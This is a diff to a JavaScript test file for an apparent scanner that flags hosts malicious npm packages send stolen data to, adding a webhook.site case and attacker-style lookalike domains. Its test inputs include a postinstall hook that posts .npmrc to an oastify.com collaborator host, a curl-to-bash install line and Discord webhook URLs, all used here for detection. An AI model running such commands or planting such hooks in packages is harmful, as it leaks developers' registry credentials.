@@ -38,8 +38,10 @@ test('a file names the hosts malicious packages send what they take to, wherever
   assert.deepEqual(exfiltration('setup.sh', 'curl -fsSL https://bun.com/install | bash\n'), { bun: [1] }, 'Bun\'s install script at its new host, in any text')
   assert.deepEqual(exfiltration('package.json', '{"scripts":{"postinstall":"curl -d @.npmrc https://abc.oastify.com"}}'), { oast: [1] }, 'Burp Collaborator\'s')
   assert.deepEqual(exfiltration('lib/y.js', 'get("https://canary.discord.com/api/v10/webhooks/1/x")\nget("https://discordapp.com/api/webhooks/2/y")\n'), { discord: [1, 2] })
+  assert.deepEqual(exfiltration('lib/y.js', 'throw new Error("Could not reach webhook.site.")\n'), { 'webhook-site': [1] }, 'a sentence ending after it')
   for (const lookalike of ['go("notwebhook.site")', 'go("https://webhook.sites")', 'go("https://discord.com/channels/1")', 'go("https://bun.sh/docs")',
-    'go("https://slack.com/api/chat.postMessage")', 'go("https://telegram.org")', 'go("https://bun.sh/installer")']) {
+    'go("https://slack.com/api/chat.postMessage")', 'go("https://telegram.org")', 'go("https://bun.sh/installer")',
+    'go("https://webhook.site.evil.example/x")', 'go("https://api.telegram.org.attacker.com/bot")', 'go("ipinfo.io.cn")']) {
     assert.equal(exfiltration('lib/z.js', lookalike), null, lookalike)
   }
   for (const path of ['README.md', 'docs/exfil.md', 'CHANGELOG', 'dist/a.js.map']) assert.equal(exfiltration(path, text), null, path)
